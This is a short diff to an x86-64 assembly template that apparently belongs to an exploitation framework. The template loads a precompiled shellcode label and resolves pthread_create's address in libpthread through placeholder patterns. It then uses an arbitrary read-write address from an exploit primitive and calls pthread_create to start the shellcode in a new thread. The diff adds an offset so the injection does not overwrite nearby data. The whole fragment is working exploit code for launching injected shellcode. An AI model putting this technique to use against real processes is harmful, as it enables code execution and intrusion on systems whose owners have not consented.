@@ -13,6 +13,7 @@ lea rax, [VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE][rip]
 mov rdx, rax
 mov rsi, 0
 mov rax, arbitrary_read_write_data_address[rip]
+add rax, 0x1000		# don't overwrite anything important
 mov rdi, rax
 mov r9, [BASEADDRESS:.+/libpthread-[0-9\.so]+$:BASEADDRESS] + [RELATIVEOFFSET:pthread_create@@GLIBC.+:RELATIVEOFFSET]
 call r9
